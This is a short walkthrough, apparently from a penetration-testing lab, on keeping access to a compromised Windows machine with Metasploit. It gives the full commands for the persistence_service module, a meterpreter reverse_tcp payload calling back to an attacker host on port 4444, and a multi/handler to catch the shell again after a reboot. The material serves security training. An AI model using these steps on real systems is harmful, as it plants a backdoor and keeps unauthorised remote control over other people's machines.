

Running the service persistence module to maintain access to the compromised
machine.

- exploit/windows/local/persistence_service
- set session 1 
- exploit
- Payload: windows/meterpreter/reverse_tcp 
- LHOST: Attack IP Address.
- LPORT: 4444

Note: By default persistence, the local exploit module uses the following payload and local port
for reverse connection.

We have successfully maintained access. Start another msfconsole and run multi handler to re-gain access. 

Commands: 
- msfconsole -q 
- use exploit/multi/handler 
- set LHOST 10.10.1.2 
- set PAYLOAD windows/meterpreter/reverse_tcp 
- set LPORT 4444 
- exploit

Switch back to the active meterpreter session and reboot the machine.
- session -i 1
- reboot
Once the machine reboots we would expect a new meterpreter session without re-exploitation. This happened because we have added a malicious executable for maintaining access.

Also, the backdoor is running as a service. Even if the session gets killed we would again gain it by re-running the Metasploit multi-handler. In this case, we exit the session and run the handler to gain the session again.